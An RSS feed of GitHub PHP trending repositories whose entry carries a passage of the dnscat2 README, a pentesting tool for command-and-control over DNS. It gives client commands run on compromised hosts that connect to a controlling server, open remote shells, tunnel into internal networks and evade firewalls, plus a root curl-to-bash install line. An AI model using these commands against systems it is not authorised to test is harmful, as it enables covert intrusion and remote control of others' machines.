<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub PHP Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-08-24T01:32:41Z</updated>
  <subtitle>Daily Trending of PHP in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>iagox86/dnscat2</title>
    <updated>2024-08-24T01:32:41Z</updated>
    <id>tag:github.com,2024-08-24:/iagox86/dnscat2</id>
    <link href="https://github.com/iagox86/dnscat2" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;p&gt;***** NOTE: The password for the .zip downloads are all &#34;password&#34;! *****&lt;/p&gt; &#xA;&lt;h1&gt;Introduction&lt;/h1&gt; &#xA;&lt;p&gt;Welcome to dnscat2, a DNS tunnel that WON&#39;T make you sick and kill you!&lt;/p&gt; &#xA;&lt;p&gt;This tool is designed to create an encrypted command-and-control (C&amp;amp;C) channel over the DNS protocol, which is an effective tunnel out of almost every network.&lt;/p&gt; &#xA;&lt;p&gt;This README file should contain everything you need to get up and running! If you&#39;re interested in digging deeper into the protocol, how the code is structured, future plans, or other esoteric stuff, check out the doc/ folder.&lt;/p&gt; &#xA;&lt;h1&gt;License&lt;/h1&gt; &#xA;&lt;p&gt;This is released under the BSD license. See &lt;a href=&#34;https://raw.githubusercontent.com/iagox86/dnscat2/master/LICENSE.md&#34;&gt;LICENSE.md&lt;/a&gt; for more information.&lt;/p&gt; &#xA;&lt;h1&gt;Overview&lt;/h1&gt; &#xA;&lt;p&gt;dnscat2 comes in two parts: the client and the server.&lt;/p&gt; &#xA;&lt;p&gt;The client is designed to be run on a compromised machine. It&#39;s written in C and has the minimum possible dependencies. It should run just about anywhere (if you find a system where it doesn&#39;t compile or run, please file a ticket, particularly if you can help me get access to said system).&lt;/p&gt; &#xA;&lt;p&gt;When you run the client, you typically specify a domain name. All requests will be sent to the local DNS server, which are then redirected to the authoritative DNS server for that domain (which you, presumably, have control of).&lt;/p&gt; &#xA;&lt;p&gt;If you don&#39;t have an authoritative DNS server, you can also use direct connections on UDP/53 (or whatever you choose). They&#39;ll be faster, and still look like DNS traffic to the casual viewer, but it&#39;s much more obvious in a packet log (all domains are prefixed with &#34;dnscat.&#34;, unless you hack the source). This mode will frequently be blocked by firewalls.&lt;/p&gt; &#xA;&lt;p&gt;The server is designed to be run on an &lt;a href=&#34;https://raw.githubusercontent.com/iagox86/dnscat2/master/doc/authoritative_dns_setup.md&#34;&gt;authoritative DNS server&lt;/a&gt;. It&#39;s in ruby, and depends on several different gems. When you run it, much like the client, you specify which domain(s) it should listen for in addition to listening for messages sent directly to it on UDP/53. When it receives traffic for one of those domains, it attempts to establish a logical connection. If it receives other traffic, it ignores it by default, but can also forward it upstream.&lt;/p&gt; &#xA;&lt;p&gt;Detailed instructions for both parts are below.&lt;/p&gt; &#xA;&lt;h1&gt;How is this different from .....&lt;/h1&gt; &#xA;&lt;p&gt;dnscat2 strives to be different from other DNS tunneling protocols by being designed for a special purpose: command and control.&lt;/p&gt; &#xA;&lt;p&gt;This isn&#39;t designed to get you off a hotel network, or to get free Internet on a plane. And it doesn&#39;t just tunnel TCP.&lt;/p&gt; &#xA;&lt;p&gt;It can tunnel any data, with no protocol attached. Which means it can upload and download files, it can run a shell, and it can do those things well. It can also potentially tunnel TCP, but that&#39;s only going to be added in the context of a pen-testing tool (that is, tunneling TCP into a network), not as a general purpose tunneling tool. That&#39;s been done, it&#39;s not interesting (to me).&lt;/p&gt; &#xA;&lt;p&gt;It&#39;s also encrypted by default. I don&#39;t believe any other public DNS tunnel encrypts all traffic!&lt;/p&gt; &#xA;&lt;h1&gt;Where to get it&lt;/h1&gt; &#xA;&lt;p&gt;Here are some important links:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/iagox86/dnscat2&#34;&gt;Sourcecode on Github&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://downloads.skullsecurity.org/dnscat2/&#34;&gt;Downloads&lt;/a&gt; (you&#39;ll find &lt;a href=&#34;https://downloads.skullsecurity.org/ron.pgp&#34;&gt;signed&lt;/a&gt; Linux 32-bit, Linux 64-bit, Win32, and source code versions of the client, plus an archive of the server - keep in mind that that signature file is hosted on the same server as the files, so if you&#39;re worried, please verify my PGP key :) )&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/iagox86/dnscat2/master/doc/README.md&#34;&gt;User documentation&lt;/a&gt; A collection of files, both for end-users (like the &lt;a href=&#34;https://raw.githubusercontent.com/iagox86/dnscat2/master/doc/changelog.md&#34;&gt;Changelog&lt;/a&gt;) and for developers (like the &lt;a href=&#34;https://raw.githubusercontent.com/iagox86/dnscat2/master/doc/contributing.md&#34;&gt;Contributing&lt;/a&gt; doc)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/iagox86/dnscat2/issues&#34;&gt;Issue tracker&lt;/a&gt; (you can also email me issues, just put my first name (ron) in front of my domain name (skullsecurity.net))&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h1&gt;How to play&lt;/h1&gt; &#xA;&lt;p&gt;The theory behind dnscat2 is simple: it creates a tunnel over the DNS protocol.&lt;/p&gt; &#xA;&lt;p&gt;Why? Because DNS has an amazing property: it&#39;ll make its way from server to server until it figures out where it&#39;s supposed to go.&lt;/p&gt; &#xA;&lt;p&gt;That means that for dnscat to get traffic off a secure network, it simply has to send messages to &lt;em&gt;a&lt;/em&gt; DNS server, which will happily forward things through the DNS network until it gets to &lt;em&gt;your&lt;/em&gt; DNS server.&lt;/p&gt; &#xA;&lt;p&gt;That, of course, assumes you have access to an authoritative DNS server. dnscat2 also supports &#34;direct&#34; connections - that is, running a dnscat client that directly connects to your dnscat on your ip address and UDP port 53 (by default). The traffic still looks like DNS traffic, and might get past dumber IDS/IPS systems, but is still likely to be stopped by firewalls.&lt;/p&gt; &#xA;&lt;p&gt;If you aren&#39;t clear on how to set up an authoritative DNS server, it&#39;s something you have to set up with a domain provider. &lt;a href=&#34;https://github.com/izhan&#34;&gt;izhan&lt;/a&gt; helpfully &lt;a href=&#34;https://github.com/iagox86/dnscat2/raw/master/doc/authoritative_dns_setup.md&#34;&gt;wrote one&lt;/a&gt; for you!&lt;/p&gt; &#xA;&lt;h2&gt;Compiling&lt;/h2&gt; &#xA;&lt;h3&gt;Client&lt;/h3&gt; &#xA;&lt;p&gt;Compiling the client should be pretty straight forward - all you should need to compile is make/gcc (for Linux) or either Cygwin or Microsoft Visual Studio (for Windows). Here are the commands on Linux:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/iagox86/dnscat2.git&#xA;$ cd dnscat2/client/&#xA;$ make&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;On Windows, load client/win32/dnscat2.vcproj into Visual Studio and hit &#34;build&#34;. I created and test it on Visual Studio 2008 - until I get a free legit copy of a newer version, I&#39;ll likely be sticking with that one. :)&lt;/p&gt; &#xA;&lt;p&gt;If compilation fails, please file a bug on my &lt;a href=&#34;https://github.com/iagox86/dnscat2/issues&#34;&gt;github page&lt;/a&gt;! Please send details about your system.&lt;/p&gt; &#xA;&lt;p&gt;You can verify dnscat2 is successfully compiled by running it with no flags; you&#39;ll see it attempting to start a DNS tunnel with whatever your configured DNS server is (which will fail):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./dnscat&#xA;Starting DNS driver without a domain! This will only work if you&#xA;are directly connecting to the dnscat2 server.&#xA;&#xA;You&#39;ll need to use --dns server=&amp;lt;server&amp;gt; if you aren&#39;t.&#xA;&#xA;** WARNING!&#xA;*&#xA;* It looks like you&#39;re running dnscat2 with the system DNS server,&#xA;* and no domain name!*&#xA;* That&#39;s cool, I&#39;m not going to stop you, but the odds are really,&#xA;* really high that this won&#39;t work. You either need to provide a&#xA;* domain to use DNS resolution (requires an authoritative server):&#xA;*&#xA;*     dnscat mydomain.com&#xA;*&#xA;* Or you have to provide a server to connect directly to:&#xA;*&#xA;*     dnscat --dns=server=1.2.3.4,port=53&#xA;*&#xA;* I&#39;m going to let this keep running, but once again, this likely&#xA;* isn&#39;t what you want!&#xA;*&#xA;** WARNING!&#xA;&#xA;Creating DNS driver:&#xA; domain = (null)&#xA; host   = 0.0.0.0&#xA; port   = 53&#xA; type   = TXT,CNAME,MX&#xA; server = 4.2.2.1&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: DNS: RCODE_NAME_ERROR&#xA;[[ ERROR ]] :: The server hasn&#39;t returned a valid response in the last 10 attempts.. closing session.&#xA;[[ FATAL ]] :: There are no active sessions left! Goodbye!&#xA;[[ WARNING ]] :: Terminating&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Server&lt;/h3&gt; &#xA;&lt;p&gt;The server isn&#39;t &#34;compiled&#34;, as such, but it does require some Ruby dependencies. Unfortunately, Ruby dependencies can be annoying to get working, so good luck! If any Ruby experts out there want to help make this section better, I&#39;d be grateful!&lt;/p&gt; &#xA;&lt;p&gt;I&#39;m assuming you have Ruby and Gem installed and in working order. If they aren&#39;t, install them with either &lt;code&gt;apt-get&lt;/code&gt;, &lt;code&gt;emerge&lt;/code&gt;, &lt;code&gt;rvm&lt;/code&gt;, or however is normal on your operating system.&lt;/p&gt; &#xA;&lt;p&gt;Once Ruby/Gem are sorted out, run these commands (note: you can obviously skip the &lt;code&gt;git clone&lt;/code&gt; command if you already installed the client and skip &lt;code&gt;gem install bundler&lt;/code&gt; if you&#39;ve already installed bundler):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ git clone https://github.com/iagox86/dnscat2.git&#xA;$ cd dnscat2/server/&#xA;$ gem install bundler&#xA;$ bundle install&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you get a permissions error with &lt;code&gt;gem install bundler&lt;/code&gt; or &lt;code&gt;bundler install&lt;/code&gt;, you may need to run them as root. If you have a lot of problems, uninstall Ruby/Gem and install everything using &lt;code&gt;rvm&lt;/code&gt; and without root.&lt;/p&gt; &#xA;&lt;p&gt;If you get an error that looks like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;/usr/lib/ruby/1.9.1/rubygems/custom_require.rb:36:in `require&#39;: cannot load such file -- mkmf (LoadError)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;It means you need to install the -dev version of Ruby:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ sudo apt-get install ruby-dev&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;I find that &lt;code&gt;sudo&lt;/code&gt; isn&#39;t always enough to get everything working right, I sometimes have to switch to root and work directly as that account. &lt;code&gt;rvmsudo&lt;/code&gt; doesn&#39;t help, because it breaks ctrl-z.&lt;/p&gt; &#xA;&lt;p&gt;You can verify the server is working by running it with no flags and seeing if you get a dnscat2&amp;gt; prompt:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# ruby ./dnscat2.rb&#xA;&#xA;New window created: 0&#xA;Welcome to dnscat2! Some documentation may be out of date.&#xA;&#xA;passthrough =&amp;gt; disabled&#xA;auto_attach =&amp;gt; false&#xA;auto_command =&amp;gt;&#xA;process =&amp;gt;&#xA;history_size (for new windows) =&amp;gt; 1000&#xA;New window created: dns1&#xA;Starting Dnscat2 DNS server on 0.0.0.0:53&#xA;[domains = n/a]...&#xA;&#xA;It looks like you didn&#39;t give me any domains to recognize!&#xA;That&#39;s cool, though, you can still use direct queries,&#xA;although those are less stealthy.&#xA;&#xA;To talk directly to the server without a domain name, run:&#xA;  ./dnscat2 --dns server=x.x.x.x,port=53&#xA;&#xA;Of course, you have to figure out &amp;lt;server&amp;gt; yourself! Clients&#xA;will connect directly on UDP port 53.&#xA;&#xA;dnscat2&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If you don&#39;t run it as root, you might have trouble listening on UDP/53 (you can use --dnsport to change it). You&#39;ll see an error message if that&#39;s the case.&lt;/p&gt; &#xA;&lt;h4&gt;Ruby as root&lt;/h4&gt; &#xA;&lt;p&gt;If you&#39;re having trouble running Ruby as root, this is what I do to run it the first time:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ cd dnscat2/server&#xA;$ su&#xA;# gpg --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3&#xA;# \curl -sSL https://get.rvm.io | bash&#xA;# source /etc/profile.d/rvm.sh&#xA;# rvm install 1.9&#xA;# rvm use 1.9&#xA;# bundle install&#xA;# ruby ./dnscat2.rb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;And subsequent times:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ cd dnscat2/server&#xA;$ su&#xA;# source /etc/profile.d/rvm.sh&#xA;# ruby ./dnscat2.rb&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;code&gt;rvmsudo&lt;/code&gt; should make it easier, but dnscat2 doesn&#39;t play well with &lt;code&gt;rvmsudo&lt;/code&gt; unfortunately.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Client + server&lt;/h3&gt; &#xA;&lt;p&gt;Before we talk about how to specifically use the tools, let&#39;s talk about how dnscat is structured. The dnscat tool is divided into two pieces: a client and a server. As you noticed if you went through the compilation, the client is written in C and the server is in Ruby.&lt;/p&gt; &#xA;&lt;p&gt;Generally, the server is run first. It can be long lived, and handle as many clients as you&#39;d like. As I said before, it&#39;s basically a C&amp;amp;C service.&lt;/p&gt; &#xA;&lt;p&gt;Later, a client is run, which opens a session with the server (more on sessions below). The session can either traverse the DNS hierarchy (recommended, but more complex) or connect directly to the server. Traversing the DNS hierarchy requires an authoritative domain, but will bypass most firewalls. Connecting directly to the server is more obvious for several reasons.&lt;/p&gt; &#xA;&lt;p&gt;By default, connections are automatically encrypted (turn it off on the client with &lt;code&gt;--no-encryption&lt;/code&gt; and on the server with &lt;code&gt;--security=open&lt;/code&gt;). When establishing a new connection, if you&#39;re paranoid about man-in-the-middle attacks, you have two options for verifying the peer:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Pass a pre-shared secret using the &lt;code&gt;--secret&lt;/code&gt; argument on both sides to validate the connection&lt;/li&gt; &#xA; &lt;li&gt;Manually verify the &#34;short authentication string&#34; - a series of words that are printed on both the client and server after encryption is negotiated&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Running a server&lt;/h3&gt; &#xA;&lt;p&gt;The server - which is typically run on the authoritative DNS server for a particular domain - is designed to be feature-ful, interactive, and user friendly. It&#39;s written in Ruby, and much of its design is inspired by Metasploit and Meterpreter.&lt;/p&gt; &#xA;&lt;p&gt;If you followed the compilation instructions above, you should be able to just run the server:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ruby ./dnscat2.rb skullseclabs.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Where &#34;skullseclabs.org&#34; is your own domain. If you don&#39;t have an authoritative DNS server, it isn&#39;t mandatory; but this tool works way, way better with an authoritative server.&lt;/p&gt; &#xA;&lt;p&gt;That should actually be all you need! Other than that, you can test it using the client&#39;s --ping command on any other system, which should be available if you&#39;ve compiled it:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./dnscat --ping skullseclabs.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If the ping succeeds, your C&amp;amp;C server is probably good! If you ran the DNS server on a different port, or if you need to use a custom DNS resolver, you can use the --dns flag in addition to --ping:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ./dnscat --dns server=8.8.8.8,domain=skullseclabs.org --ping&#xA;&#xA;$ ./dnscat --dns port=53531,server=localhost,domain=skullseclabs.org --ping&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note that when you specify a --dns argument, the domain has to be part of that argument (as domain=xxx). You can&#39;t just pass it on the commandline (due to a limitation of my command parsing; I&#39;ll likely improve that in a future release).&lt;/p&gt; &#xA;&lt;p&gt;When the process is running, you can start a new server using basically the exact same syntax:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; start --dns=port=53532,domain=skullseclabs.org,domain=test.com&#xA;New window created: dns2&#xA;Starting Dnscat2 DNS server on 0.0.0.0:53532&#xA;[domains = skullseclabs.org, test.com]...&#xA;&#xA;Assuming you have an authoritative DNS server, you can run&#xA;the client anywhere with the following:&#xA;  ./dnscat2 skullseclabs.org&#xA;  ./dnscat2 test.com&#xA;&#xA;To talk directly to the server without a domain name, run:&#xA;  ./dnscat2 --dns server=x.x.x.x,port=53532&#xA;&#xA;Of course, you have to figure out &amp;lt;server&amp;gt; yourself! Clients&#xA;will connect directly on UDP port 53532.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You can run as many DNS listeners as you want, as long as they&#39;re on different hosts/ports. Once the data comes in, the rest of the process doesn&#39;t even know which listener data came from; in fact, a client can send different packets to different ports, and the session will continue as expected.&lt;/p&gt; &#xA;&lt;h3&gt;Running a client&lt;/h3&gt; &#xA;&lt;p&gt;The client - which is typically run on a system after compromising it - is designed to be simple, stable, and portable. It&#39;s written in C and has as few library dependencies as possible, and compiles/runs natively on Linux, Windows, Cygwin, FreeBSD, and Mac OS X.&lt;/p&gt; &#xA;&lt;p&gt;The client is given the domain name on the commandline, for example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./dnscat2 skullseclabs.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;In that example, it will create a C&amp;amp;C session with the dnscat2 server running on skullseclabs.org. If an authoritative domain isn&#39;t an option, it can be given a specific ip address to connect to instead:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./dnscat2 --dns host=206.220.196.59,port=5353&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Assuming there&#39;s a dnscat2 server running on that host/port, it&#39;ll create a session there.&lt;/p&gt; &#xA;&lt;h3&gt;Tunnels&lt;/h3&gt; &#xA;&lt;p&gt;Yo dawg; I hear you like tunnels, so now you can tunnel a tunnel through your tunnel!&lt;/p&gt; &#xA;&lt;p&gt;It is currently possible to tunnel a connection through dnscat2, similar to &#34;ssh -L&#34;! Other modes (&#34;ssh -D&#34; and &#34;ssh -R&#34;) are coming soon as well!&lt;/p&gt; &#xA;&lt;p&gt;After a session has started (a command session), the command &#34;listen&#34; is used to open a new tunnelled port. The syntax is roughly the same as ssh -L:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;listen [lhost:]lport rhost:rport&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The local host is option, and will default to all interfaces (0.0.0.0). The local port and remote host/port are mandatory.&lt;/p&gt; &#xA;&lt;p&gt;The dnscat2 server will listen on lport. All connections received to that port are forwarded, via the dnscat2 client, to the remote host/port chosen.&lt;/p&gt; &#xA;&lt;p&gt;For example, this will listen on port 4444 (on the &lt;em&gt;server&lt;/em&gt;) and forward traffic to google:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;listen 4444 www.google.com:80&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then, if you connect to &lt;a href=&#34;http://localhost:4444&#34;&gt;http://localhost:4444&lt;/a&gt;, it&#39;ll come out the dnscat2 client and connect to google.com.&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s say you&#39;re using this on a pentest and you want to forward ssh connections through the dnscat2 client (running on somebody&#39;s corp network) to an internal device. You can!&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;listen 127.0.0.1:2222 10.10.10.10:22&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;That&#39;ll only listen on the localhost interface on the dnscat2 server, and will forward connections via the tunnel to port 22 of 10.10.10.10.&lt;/p&gt; &#xA;&lt;h3&gt;Encryption&lt;/h3&gt; &#xA;&lt;p&gt;dnscat2 is encrypted by default.&lt;/p&gt; &#xA;&lt;p&gt;I&#39;m not a cryptographer, and by necessity I came up with the encryption scheme myself. As a result, I wouldn&#39;t trust this 100%. I think I did a &lt;em&gt;pretty&lt;/em&gt; good job preventing attacks, but this hasn&#39;t been professionally audited. Use with caution.&lt;/p&gt; &#xA;&lt;p&gt;There is a ton of technical information about the encryption in the &lt;a href=&#34;https://raw.githubusercontent.com/iagox86/dnscat2/master/doc/protocol.md&#34;&gt;protocol doc&lt;/a&gt;. But here are the basics.&lt;/p&gt; &#xA;&lt;p&gt;By default, both the client and the server support and will attempt encryption. Each connection uses a new keypair, negotiated by ECDH. All encryption is done by salsa20, and signatures use sha3.&lt;/p&gt; &#xA;&lt;p&gt;Encryption can be disabled on the client by passing &lt;code&gt;--no-encryption&lt;/code&gt; on the commandline, or by compiling it using &lt;code&gt;make nocrypto&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;The server will reject unencrypted connections by default. To allow unencrypted connections, pass &lt;code&gt;--security=open&lt;/code&gt; to the server, or run &lt;code&gt;set security=open&lt;/code&gt; on the console.&lt;/p&gt; &#xA;&lt;p&gt;By default, there&#39;s no protection against man-in-the-middle attacks. As mentioned before, there are two different ways to gain MitM protection: a pre-shared secret or a &#34;short authentication string&#34;.&lt;/p&gt; &#xA;&lt;p&gt;A pre-shared secret is passed on the commandline to both the client and the server, and is used to authenticate both the client to the server and the server to the client. It should be a somewhat strong value - something that can&#39;t be quickly guessed by an attacker (there&#39;s only a short window for the attacker to guess it, so it only has to hold up for a few seconds).&lt;/p&gt; &#xA;&lt;p&gt;The pre-shared secret is passed in via the &lt;code&gt;--secret&lt;/code&gt; parameter on both the client and the server. The server can change it at runtime using &lt;code&gt;set secret=&amp;lt;new value&amp;gt;&lt;/code&gt;, but that can have unexpected results if active clients are connected.&lt;/p&gt; &#xA;&lt;p&gt;Furthermore, the server can enforce &lt;em&gt;only&lt;/em&gt; authenticated connections are allowed by using &lt;code&gt;--security=authenticated&lt;/code&gt; or &lt;code&gt;set security=authenticated&lt;/code&gt;. That&#39;s enabled by default if you pass the &lt;code&gt;--secret&lt;/code&gt; parameter.&lt;/p&gt; &#xA;&lt;p&gt;If you don&#39;t require the extra effort of authenticating connections, then a &#34;short authentication string&#34; is displayed by both the client and the server. The short authentication string is a series of English words that are derived based on the secret values that both sides share.&lt;/p&gt; &#xA;&lt;p&gt;If the same set of English words are printed on both the client and the server, the connection can be reasonably considered to be secure.&lt;/p&gt; &#xA;&lt;p&gt;That&#39;s about all you need to know about the encryption! See the protocol doc for details! I&#39;d love to hear any feedback on the crypto, as well. :)&lt;/p&gt; &#xA;&lt;p&gt;And finally, if you have any problems with the crypto, please let me know! By default a window called &#34;crypto-debug&#34; will be created at the start. If you have encryption problems, please send me that log! Or, better yet, run dnscat2 with the &lt;code&gt;--firehose&lt;/code&gt; and &lt;code&gt;--packet-trace&lt;/code&gt; arguments, and send me &lt;em&gt;EVERYTHING&lt;/em&gt;! Don&#39;t worry about revealing private keys; they&#39;re only used for that one session.&lt;/p&gt; &#xA;&lt;h3&gt;dnscat2&#39;s Windows&lt;/h3&gt; &#xA;&lt;p&gt;The dnscat2 UI is made up of a bunch of windows. The default window is called the &#39;main&#39; window. You can get a list of windows by typing &lt;code&gt;windows&lt;/code&gt; (or &lt;code&gt;sessions&lt;/code&gt;) into any command prompt:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; windows&#xA;0 :: main [active]&#xA;  dns1 :: DNS Driver running on 0.0.0.0:53 domains = skullseclabs.org [*]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You&#39;ll note that there are two windows - window &lt;code&gt;0&lt;/code&gt; is the main window, and window &lt;code&gt;dns1&lt;/code&gt; is the listener (technically referred to as the &#39;tunnel driver&#39;).&lt;/p&gt; &#xA;&lt;p&gt;From any window that accepts commands (&lt;code&gt;main&lt;/code&gt; and command sessions), you can type &lt;code&gt;help&lt;/code&gt; to get a list of commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; help&#xA;&#xA;Here is a list of commands (use -h on any of them for additional help):&#xA;* echo&#xA;* help&#xA;* kill&#xA;* quit&#xA;* set&#xA;* start&#xA;* stop&#xA;* tunnels&#xA;* unset&#xA;* window&#xA;* windows&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;For any of those commands, you can use -h or --help to get details:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; window --help&#xA;Error: The user requested help&#xA;&#xA;Interact with a window&#xA;  -i, --i=&amp;lt;s&amp;gt;    Interact with the chosen window&#xA;  -h, --help     Show this message&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;We&#39;ll use the &lt;code&gt;window&lt;/code&gt; command to interact with &lt;code&gt;dns1&lt;/code&gt;, which is a status window:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; window -i dns1&#xA;New window created: dns1&#xA;Starting Dnscat2 DNS server on 0.0.0.0:53531&#xA;[domains = skullseclabs.org]...&#xA;&#xA;Assuming you have an authoritative DNS server, you can run&#xA;the client anywhere with the following:&#xA;  ./dnscat2 skullseclabs.org&#xA;&#xA;To talk directly to the server without a domain name, run:&#xA;  ./dnscat2 --dns server=x.x.x.x,port=53531&#xA;&#xA;Of course, you have to figure out &amp;lt;server&amp;gt; yourself! Clients&#xA;will connect directly on UDP port 53531.&#xA;&#xA;Received:  dnscat.9fa0ff178f72686d6c716c6376697968657a6d716800 (TXT)&#xA;Sending:  9fa0ff178f72686d6c716c6376697968657a6d716800&#xA;Received:  d17cff3e747073776c776d70656b73786f646f616200.skullseclabs.org (MX)&#xA;Sending:  d17cff3e747073776c776d70656b73786f646f616200.skullseclabs.org&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The received and sent strings there are, if you decode them, pings.&lt;/p&gt; &#xA;&lt;p&gt;You can switch to the &#39;parent&#39; window (in this case, &lt;code&gt;main&lt;/code&gt;) by pressing ctrl-z. If ctrl-z kills the process, then you probably have to find a better way to run it (&lt;code&gt;rvmsudo&lt;/code&gt; doesn&#39;t work, see above).&lt;/p&gt; &#xA;&lt;p&gt;When a new client connects and creates a session, you&#39;ll be notified in &lt;code&gt;main&lt;/code&gt; (and certain other windows):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;New window created: 1&#xA;dnscat2&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(Note that you have to press enter to get the prompt back)&lt;/p&gt; &#xA;&lt;p&gt;You can switch to the new window the same way we switched to the &lt;code&gt;dns1&lt;/code&gt; status window:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; window -i 1&#xA;New window created: 1&#xA;history_size (session) =&amp;gt; 1000&#xA;This is a command session!&#xA;&#xA;That means you can enter a dnscat2 command such as&#xA;&#39;ping&#39;! For a full list of clients, try &#39;help&#39;.&#xA;&#xA;command session (ubuntu-64) 1&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Command sessions can spawn additional sessions; for example, the &lt;code&gt;shell&lt;/code&gt; command:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;command session (ubuntu-64) 1&amp;gt; shell&#xA;Sent request to execute a shell&#xA;New window created: 2&#xA;Shell session created!&#xA;&#xA;command session (ubuntu-64) 1&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(Note that throughout this document I&#39;m cleaning up the output; usually you have to press enter to get the prompt back)&lt;/p&gt; &#xA;&lt;p&gt;Then, if you return to the main session (ctrl-z or &lt;code&gt;suspend&lt;/code&gt;, you&#39;ll see it in the list of windows:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;dnscat2&amp;gt; windows&#xA;0 :: main [active]&#xA;  dns1 :: DNS Driver running on 0.0.0.0:53531 domains = skullseclabs.org [*]&#xA;  1 :: command session (ubuntu-64)&#xA;  2 :: sh (ubuntu-64) [*]&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Unfortunately, the &#39;windows&#39; command in a specific command session only shows child windows from that session, and right now new sessions aren&#39;t spawned as children.&lt;/p&gt; &#xA;&lt;p&gt;Note that some sessions have &lt;code&gt;[*]&lt;/code&gt; - that means that there&#39;s been activity since the last time we looked at them.&lt;/p&gt; &#xA;&lt;p&gt;When you interact with a session, the interface will look different depending on the session type. As you saw with the default session type (command sessions) you get a UI just like the top-level session (you can type &#39;help&#39; or run commands or whatever). However, if you interact with a &#39;shell&#39; session, you won&#39;t see much immediately, 